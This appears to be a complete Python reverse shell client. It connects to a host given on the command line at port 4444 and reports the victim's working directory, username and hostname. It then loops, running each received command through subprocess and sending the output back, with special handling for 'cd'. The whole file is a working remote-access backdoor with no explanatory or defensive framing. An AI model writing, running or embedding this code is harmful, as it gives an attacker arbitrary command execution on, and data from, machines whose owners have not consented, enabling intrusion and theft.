import socket
import os
import subprocess
import sys
import pwd

SERVER_HOST = sys.argv[1]
SERVER_PORT = 4444
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
hostname = subprocess.getoutput("hostname")
username = pwd.getpwuid(os.getuid())[0]
message = f"{cwd}{SEPARATOR}{username}{SEPARATOR}{hostname}"
s.send(message.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    split_command = command.split()
    if command.lower() == "exit":
        break
    if split_command[0].lower() == "cd":
        try:
            if len(split_command) == 1:
                os.chdir(subprocess.getoutput("echo $HOME"))
            else:
                os.chdir(" ".join(split_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
s.close()